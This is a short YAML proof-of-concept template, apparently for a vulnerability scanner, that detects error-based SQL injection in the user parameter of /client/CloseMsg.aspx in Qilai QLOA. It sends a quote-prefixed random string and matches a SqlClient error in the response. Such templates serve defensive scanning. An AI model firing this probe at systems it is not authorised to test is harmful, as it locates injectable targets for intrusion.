name: yaml-poc-qilai-qloa-sql_injection-CT-630598
binding: 4d3521e1-d9f5-45ef-8d53-552e5a973760
detail:
    author: haiqing.chen
    vulnerability:
        id: a30ee01d-1d3f-4eac-bebb-47e4ddca9e76
        level: high
    warning: Harmless
transport: http
set:
    r1: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /client/CloseMsg.aspx?user='{{r1}}
            follow_redirects: true
        expression: response.status == 500 && response.body_string.contains("System.Data.SqlClient") && response.body_string.contains(string(r1))
expression: r0()
